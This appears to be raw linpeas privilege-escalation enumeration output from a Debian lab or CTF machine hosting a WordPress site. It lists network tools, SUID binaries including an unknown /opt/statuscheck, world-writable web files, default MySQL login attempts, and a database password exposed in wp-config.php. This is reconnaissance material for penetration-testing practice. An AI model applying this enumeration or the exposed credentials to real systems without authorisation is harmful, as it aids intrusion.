uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 16:07:06 up  1:38,  0 users,  load average: 0.01, 0.01, 0.00                                                                             
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
root     pts/0        Fri Jun 28 20:02:55 2019 - crash                     (00:20)     192.168.201.133                                    
helios   pts/0        Fri Jun 28 19:58:43 2019 - Fri Jun 28 19:59:12 2019  (00:00)     192.168.201.133
helios   pts/0        Fri Jun 28 19:58:23 2019 - Fri Jun 28 19:58:24 2019  (00:00)     192.168.201.133
root     pts/0        Fri Jun 28 19:48:43 2019 - Fri Jun 28 19:58:17 2019  (00:09)     192.168.201.133
root     pts/0        Fri Jun 28 19:38:22 2019 - Fri Jun 28 19:46:18 2019  (00:07)     192.168.201.133
helios   pts/0        Fri Jun 28 19:32:27 2019 - Fri Jun 28 19:37:52 2019  (00:05)     192.168.201.133
helios   pts/0        Fri Jun 28 19:31:40 2019 - Fri Jun 28 19:31:51 2019  (00:00)     192.168.201.133
reboot   system boot  Fri Jun 28 19:30:35 2019   still running                         0.0.0.0

wtmp begins Fri Jun 28 19:30:35 2019

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                         
root             pts/0    172.16.52.129    Fri Jun 28 21:09:22 -0500 2019
helios           pts/0    192.168.201.133  Fri Jun 28 19:58:43 -0500 2019

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)                                                                                                                             
                                                                                                                                          
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                          


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                        
                             ╚══════════════════════╝                                                                                     
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                           
/usr/bin/curl
/usr/bin/gcc
/bin/nc
/bin/nc.traditional
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/socat
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  gcc                           4:6.3.0-4                      amd64        GNU C compiler                                              
ii  gcc-6                         6.3.0-18+deb9u1                amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.25 (Debian)                                                                                    
Server built:   2019-04-02T19:05:13
httpd Not Found
                                                                                                                                          
Nginx version: nginx Not Found
                                                                                                                                          
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Jun 28  2019 /etc/apache2/sites-enabled                                                                       
drwxr-xr-x 2 root root 4096 Jun 28  2019 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Jun 28  2019 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Nov  3  2018 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Jun 28  2019 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 70999 Mar  8  2019 /etc/php/7.0/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 70656 Mar  8  2019 /etc/php/7.0/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Searching AD cached hashes
-rw------- 1 root root 430080 Jun 28  2019 /var/lib/samba/private/secrets.tdb                                                             

╔══════════╣ Analyzing MariaDB Files (limit 70)
-rw-r--r-- 1 root root 869 Feb  6  2019 /etc/mysql/mariadb.cnf                                                                            
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

-rw------- 1 root root 277 Jun 28  2019 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-rw-rw- 1 helios helios 3182 Jun 28  2019 /var/www/html/h3l105/wp-config.php                                                           
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'password123' );
define( 'DB_HOST', 'localhost' );

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Dec 10  2017 /usr/share/doc/rsync/examples/rsyncd.conf                                                        
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun 28  2019 /etc/pam.d                                                                                       
-rw-r--r-- 1 root root 2133 Mar  1  2019 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                      
drwxr-xr-x 2 root root 4096 Jun 28  2019 /etc/ldap


╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun 28  2019 /usr/share/keyrings                                                                              




╔══════════╣ Analyzing Postfix Files (limit 70)
-rwxr-xr-x 1 root root 3624 Mar 25  2019 /etc/init.d/postfix                                                                              

-rw-r--r-- 1 root root 30 Mar 25  2019 /etc/insserv.conf.d/postfix

-rwxr-xr-x 1 root root 800 Mar 25  2019 /etc/network/if-down.d/postfix

-rwxr-xr-x 1 root root 1117 Mar 25  2019 /etc/network/if-up.d/postfix

drwxr-xr-x 5 root root 4096 Jun 28  2019 /etc/postfix
-rw-r--r-- 1 root root 6068 Jun 28  2019 /etc/postfix/master.cf
  flags=DRhu user=vmail argv=/usr/bin/maildrop -d ${recipient}
#  user=cyrus argv=/cyrus/bin/deliver -e -r ${sender} -m ${extension} ${user}
#  flags=R user=cyrus argv=/cyrus/bin/deliver -e -m ${extension} ${user}
  flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
  flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
  flags=Fq. user=bsmtp argv=/usr/lib/bsmtp/bsmtp -t$nexthop -f$sender $recipient
  flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store ${nexthop} ${user} ${extension}
  flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py

-rwxr-xr-x 1 root root 800 Mar 25  2019 /etc/ppp/ip-down.d/postfix

-rwxr-xr-x 1 root root 1117 Mar 25  2019 /etc/ppp/ip-up.d/postfix

-rwxr-xr-x 1 root root 439 Mar 25  2019 /etc/resolvconf/update-libc.d/postfix

-rw-r--r-- 1 root root 361 Mar 25  2019 /etc/ufw/applications.d/postfix

drwxr-xr-x 3 root root 4096 Jun 28  2019 /usr/lib/postfix

-rwxr-xr-x 1 root root 14408 Mar 25  2019 /usr/sbin/postfix

-rw-r--r-- 1 root root 694 Apr 12  2016 /usr/share/bash-completion/completions/postfix

drwxr-xr-x 2 root root 4096 Jun 28  2019 /usr/share/doc/postfix

-rw-r--r-- 1 root root 166 Mar 25  2019 /usr/share/lintian/overrides/postfix

drwxr-xr-x 2 root root 4096 Jun 28  2019 /usr/share/postfix

drwxr-xr-x 2 postfix postfix 4096 May 12 10:29 /var/lib/postfix

drwxr-xr-x 20 root root 4096 Jun 28  2019 /var/spool/postfix
find: '/var/spool/postfix/deferred': Permission denied
find: '/var/spool/postfix/bounce': Permission denied
find: '/var/spool/postfix/private': Permission denied
find: '/var/spool/postfix/hold': Permission denied
find: '/var/spool/postfix/defer': Permission denied
find: '/var/spool/postfix/maildrop': Permission denied
find: '/var/spool/postfix/corrupt': Permission denied
find: '/var/spool/postfix/trace': Permission denied
find: '/var/spool/postfix/active': Permission denied
find: '/var/spool/postfix/flush': Permission denied
find: '/var/spool/postfix/incoming': Permission denied
find: '/var/spool/postfix/saved': Permission denied
find: '/var/spool/postfix/public': Permission denied


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                          


-rw-r--r-- 1 root root 69 Mar  8  2019 /etc/php/7.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Mar  8  2019 /usr/share/php7.0-common/common/ftp.ini






╔══════════╣ Analyzing Samba Files (limit 70)
smbstatus only works as root!                                                                                                             
-rw-r--r-- 1 root root 9445 Jun 28  2019 /etc/samba/smb.conf
;   logon script = logon.cmd
   
   
   create mask = 0700
   directory mask = 0700
;   guest ok = yes
;   
# The path below should be writable by all users so that their
;   
;   
;   create mask = 0600
;   directory mask = 0700
   
   
   
   create mask = 0700
   browseable = yes
   
   
   browseable = yes
   
  guest ok = yes
  
-rw-r--r-- 1 root root 9231 May  8  2019 /usr/share/samba/smb.conf
;   logon script = logon.cmd
   
   
   create mask = 0700
   directory mask = 0700
;   guest ok = yes
;   
# The path below should be writable by all users so that their
;   
;   
;   create mask = 0600
;   directory mask = 0700
   
   
   
   create mask = 0700
   browseable = yes
   
   

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3526 May 15  2017 /etc/skel/.bashrc                                                                                
-rw-r--r-- 1 helios helios 3526 Jun 28  2019 /home/helios/.bashrc





-rw-r--r-- 1 root root 675 May 15  2017 /etc/skel/.profile
-rw-r--r-- 1 helios helios 675 Jun 28  2019 /home/helios/.profile




╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                                          





















lrwxrwxrwx 1 root root 22 Jun 28  2019 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf
lrwxrwxrwx 1 root root 24 Jun 28  2019 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 83 Jun 28  2019 /var/lib/dpkg/alternatives/my.cnf





























╔══════════╣ Searching kerberos conf files and tickets
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-active-directory.html#linux-active-directory                 
ptrace protection is disabled (0), you might find tickets inside processes memory                                                         
-rw-r--r-- 1 root root 89 Aug 11  2016 /usr/share/samba/setup/krb5.conf
[libdefaults]
        default_realm = ${REALM}
        dns_lookup_realm = false
        dns_lookup_kdc = true
tickets kerberos Not Found
klist Not Found                                                                                                                           
                                                                                                                                          

╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user         = mysql                                                           
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

╔══════════╣ MySQL version
mysql  Ver 15.1 Distrib 10.1.38-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                 


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                                                
═╣ MySQL connection using root/NOPASS ................. No                                                                                
                                                                                                                                          
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                              
netpgpkeys Not Found
netpgp Not Found                                                                                                                          
                                                                                                                                          
-rw-r--r-- 1 root root 5138 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-jessie-automatic.gpg
-rw-r--r-- 1 root root 5147 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-jessie-security-automatic.gpg
-rw-r--r-- 1 root root 2775 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-jessie-stable.gpg
-rw-r--r-- 1 root root 7483 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7492 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2275 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg
-rw-r--r-- 1 root root 3780 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-wheezy-automatic.gpg
-rw-r--r-- 1 root root 2851 May 25  2017 /etc/apt/trusted.gpg.d/debian-archive-wheezy-stable.gpg
-rw-r--r-- 1 root root 3452 Feb  7  2019 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 36941 May 25  2017 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r-- 1 root root 17538 May 25  2017 /usr/share/keyrings/debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root 2434 Apr 27  2019 /var/lib/apt/lists/ftp.us.debian.org_debian_dists_stretch_Release.gpg
-----BEGIN PGP SIGNATURE-----
iQIzBAABCAAdFiEEob2OnXj3/lw+Zdivi0itYkaSVVMFAlzEIUQACgkQi0itYkaS
VVPw6xAAmMYOUY9pICjACM0py/CoqCpSOdSHGdi/EUdkza/K+zQBg+Yr1cqkmGjF
ytmjpTlFKsG3cyDH67vaC8JxNDINre+p6Iv/dkRXAwpnGknusrj34jx4RvByjypj
DqhuJNeBCrgnu8ztPP1FvNpkau5JHbgiuFTDpcDly1W/BeZgYVOsciHgnAepTFCR
cqzIQ5Cau6QOTAyq099M9lBqOjSX8cAaWfemSzeF1lcF0J21Rsv8Xc8GtFPcntnm
aW3LS2MjiyA+UTDZziqIvNDWIQKlI98hwZeeDUBTBhPWDzpBH1bnZVHpwEKSgRDx
gOsL138LGoSNHTkQGsrBYKqlSNo8xcXWocQh6jaFa11haTU95juNb6ePJUNfMvFn
57TlGxSMOkgHgBSodDGFwrEIBV2TrgaWpX3kDSsI6ALVHO650eOlCZIi3NLCSQG4
qIkLx+zRDKA0oJt/9EqpG+k6cUU1ePFF7YkH7Y2XrHtgwWK21FXGVDzqUsTk0+Hh
IwFJq9xTBeHPTlP6+pw9iMSAbF3CmRxETXnMgQdgjl9XAnjs7+DTeYDBvU7AeUVB
t919QOh5A6yGqUI99kre3Bo4NKlR54AUWOaLi5s1sPMVyaT8diirzd2tT89Rp7Uy
j9ksDeB2GIRM63TdvsXXwUcAKXd1wLjyaui4s7MsjZSFBvbl+BWJAjMEAAEIAB0W
IQQSbA0kvYopQsx9+Kx2ONBEK5DQEAUCXMQhRAAKCRB2ONBEK5DQEOakEACF9yqX
XZk6gMClONDyj6ljpIfNBO44wNl6uabn+UXVG5TXgxcTYkTf0kIg2pdE52cxis7w
8bKmmvpI2be+ysg2exTostlOgz+LUCM4fNfsehtP3niMtfi31l8L3oJVvF/awHF0
hLP0LCx7auHBLDhjtMF3uRa9u3y/D5FmAQHCXZq/44y7pb5Oxz4fWuGZm66q27Gp
2xTfZJLzTgWzo5EAnMC+lXr2XNOexozvqwjysobuPxXewMMzRUI+sHC0GZpWYiy8
E9XIB23/z2tL9nVSBVc2QNqS8f60c4a04os6D/2+JGL8d7wWaANepD8Aioj7E4uK
iwmHQAOpTreyywreG2k4+QaEAYOrkPc3Djfe22LemQM9F7VqPhTTtdtUqhZfxkqY
zOzanmJ43X6c8BPNbN9OLY819Upbczsm/w2RFYFuzEDUFHvzU0APMzuRZoL1UK48
42CTBziC24FxPn8APdVHjSghFT1KyHDDKNT5D3kSgrP1oZ3uDkjapa8U7su8kBiM
X9Vvypce+uUclzmUJbnOiy/WjAYNA+ulikU8n5YN1wUbm+57szI8zg+wl8T1hJYf
Z0w+Uj+uc6UV8O7J7s419/M/5dBEPN85AUEPV1O4/RHdur0JnDGYmOJ9X4bsa3qz
hLYYJ+LVG8IRQAgWr9TyfOCp3b79eDxDYY2jaA==
=VFn6
-----END PGP SIGNATURE-----
-----BEGIN PGP SIGNATURE-----
iQIzBAABCAAdFiEEBn48RWuuJArO6I9v7w84Khp7ZQAFAlzEIe0ACgkQ7w84Khp7
ZQDeSBAAq1yhIaKrx7gbMzByxjjbtlA3ZnAvm84txxijkUkVS5Nhb/c0XXYdvDCE
8tWzHzNhhcx8RhKhkezgdcJz6p5keAna/yocCh4xKIMHHm3SptgJixfnUOiBxN+J
IzkUv90v4xUtJW1EbZHz54rNX+OyI9RtVZDfMG1wnVkh05f92s4yzceZCMbWrd/+
TDUd9Gw3IsPw2Sk8Uij9fW9YxhYETyS5dFlJD3epbX/vh1li2fX32sgDrVkIhCfJ
nN5b8P7LX66T0wnStUH0shwFTCtfHrfSLj8d/lVOQ6wI3xnfM3QhcRbn1rPGHOe2
yn4QEozdP11z5z7dgh+2eWcwZauQUzp5b9u4WmwXDt4+nzohRLcvqnp5i144YNj+
EHCuyaP1VhBL7ra/+CrtMIeNicrC815vdKkVAFCMHm35uSlI7kQjkHLw+FSMxyDE
1P4AOP7j/VYPwzHabF3EozWEsvkO/Sp5fC/ebzeEoCMbr1rgJDpfZ+nsLc4KN4Re
uBKbkOC+Rnxp6tsKZ/GcfcZv8PS0dk9W9ptO20mMo5A8zP+n8bfh8LSW0kzFdwTp
pGYXqDX7ZP1lhCCkmhIoUrSQix2+7ns8LnBRPVInUNuGiMD1wxNi8m9ShKV9Ya6K
pctks4qaSN77SUkPiOpmMVLf04/BQWxB7XrdltefnTcWws/OayA=
=udpf
-----END PGP SIGNATURE-----


╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                            
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                               
                                                                                                                                          




-rw-r--r-- 1 root root 175 Jun 28  2019 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 95 Jun 28  2019 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 395 Jun 28  2019 /etc/ssh/ssh_host_rsa_key.pub

PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem                                                                                                              
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_Raíz_Certicámara_S.A..pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AddTrust_External_Root.pem
/etc/ssl/certs/AddTrust_Low-Value_Services_Root.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/CA_Disig_Root_R2.pem
1506PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                            
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                          


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes




                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                        
                      ╚════════════════════════════════════╝                                                                              
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                           
strace Not Found                                                                                                                          
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device                                                                 
-rwsr-xr-- 1 root messagebus 42K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 431K Mar  1  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 59K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                              
-rwsr-xr-x 1 root root 75K May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 40K May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 49K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 8.5K Jun 28  2019 /opt/statuscheck (Unknown SUID binary!)
-rwsr-xr-x 1 root root 44K Mar  7  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 31K Mar  7  2018 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 40K May 17  2017 /bin/su
-rwsr-xr-x 1 root root 60K Nov 10  2016 /bin/ping

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                           
-rwxr-sr-x 1 root shadow 35K May 27  2017 /sbin/unix_chkpwd                                                                               
-r-xr-sr-x 1 root postdrop 15K Mar 25  2019 /usr/sbin/postdrop
-r-xr-sr-x 1 root postdrop 23K Mar 25  2019 /usr/sbin/postqueue
-rwxr-sr-x 1 root shadow 23K May 17  2017 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 71K May 17  2017 /usr/bin/chage
-rwxr-sr-x 1 root tty 15K Apr 12  2017 /usr/bin/bsd-write
-rwxr-sr-x 1 root tty 27K Mar  7  2018 /usr/bin/wall
-rwxr-sr-x 1 root ssh 351K Mar  1  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root mail 19K Jan 17  2017 /usr/bin/dotlockfile
-rwxr-sr-x 1 root crontab 40K Oct  7  2017 /usr/bin/crontab
-rwxr-sr-x 1 root mail 11K Dec 24  2016 /usr/bin/dotlock.mailutils

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                                    
files with acls in searched folders Not Found                                                                                             
                                                                                                                                          
╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                            
══╣ Current shell capabilities                                                                                                            
CapInh: 0000000000000000                                                                                                                  
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

══╣ Parent proc capabilities
CapInh: 0000000000000000                                                                                                                  
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000


Files with capabilities (limited to 50):

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                                    
/etc/ld.so.conf                                                                                                                           
Content of /etc/ld.so.conf:                                                                                                               
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                                                             
  - /usr/local/lib                                                                                                                        
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /lib/x86_64-linux-gnu                                                                                                                 
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/                                                                                           
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                          
total 12                                                                                                                                  
drwxr-xr-x  2 root root 4096 Jun 28  2019 .
drwxr-xr-x 83 root root 4096 May 28 16:05 ..
-rw-r--r--  1 root root  663 Apr 12  2016 bash_completion.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                              
                                                                                                                                          
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root 730 Apr 16  2019 usr.sbin.mysqld                                                                                   

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                              
═╣ Credentials in fstab/mtab? ........... No                                                                                              
═╣ Can I read shadow files? ............. No                                                                                              
═╣ Can I read shadow plists? ............ No                                                                                              
═╣ Can I write shadow plists? ........... No                                                                                              
═╣ Can I read opasswd file? ............. No                                                                                              
═╣ Can I write in network-scripts? ...... No                                                                                              
═╣ Can I read root folder? .............. No                                                                                              
                                                                                                                                          
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                    
/home/helios/.bash_history
/root/
/var/www

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                                                                          
╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                          
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                          
uniq: write error: Broken pipe                                                                                                            
/dev/mqueue
/dev/shm
/home/helios
/run/lock
/run/lock/apache2
/tmp
/tmp/linpeas.sh
/var/lib/php/sessions
/var/mail/helios
/var/spool/samba
/var/tmp
/var/www/html
/var/www/html/h3l105
/var/www/html/h3l105/.htaccess
/var/www/html/h3l105/index.php
/var/www/html/h3l105/license.txt
/var/www/html/h3l105/readme.html
/var/www/html/h3l105/wp-activate.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-admin/about.php
/var/www/html/h3l105/wp-admin/admin-ajax.php
/var/www/html/h3l105/wp-admin/admin-footer.php
/var/www/html/h3l105/wp-admin/admin-functions.php
/var/www/html/h3l105/wp-admin/admin-header.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-admin/css/about-rtl.css
/var/www/html/h3l105/wp-admin/css/about-rtl.min.css
/var/www/html/h3l105/wp-admin/css/about.css
/var/www/html/h3l105/wp-admin/css/about.min.css
/var/www/html/h3l105/wp-admin/css/admin-menu-rtl.css
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/h3l105/wp-admin/css/colors/_admin.scss
/var/www/html/h3l105/wp-admin/css/colors/_mixins.scss
/var/www/html/h3l105/wp-admin/css/colors/_variables.scss
/var/www/html/h3l105/wp-admin/css/colors/blue
/var/www/html/h3l105/wp-admin/css/colors/blue/colors-rtl.css
/var/www/html/h3l105/wp-admin/css/colors/blue/colors-rtl.min.css
/var/www/html/h3l105/wp-admin/css/colors/blue/colors.css
/var/www/html/h3l105/wp-admin/css/colors/blue/colors.min.css
/var/www/html/h3l105/wp-admin/css/colors/blue/colors.scss
/var/www/html/h3l105/wp-admin/css/colors/coffee
/var/www/html/h3l105/wp-admin/css/colors/coffee/colors-rtl.css
/var/www/html/h3l105/wp-admin/css/colors/coffee/colors-rtl.min.css
/var/www/html/h3l105/wp-admin/css/colors/coffee/colors.css
/var/www/html/h3l105/wp-admin/css/colors/coffee/colors.min.css
/var/www/html/h3l105/wp-admin/css/colors/coffee/colors.scss
/var/www/html/h3l105/wp-admin/css/colors/ectoplasm
/var/www/html/h3l105/wp-admin/css/colors/ectoplasm/colors-rtl.css
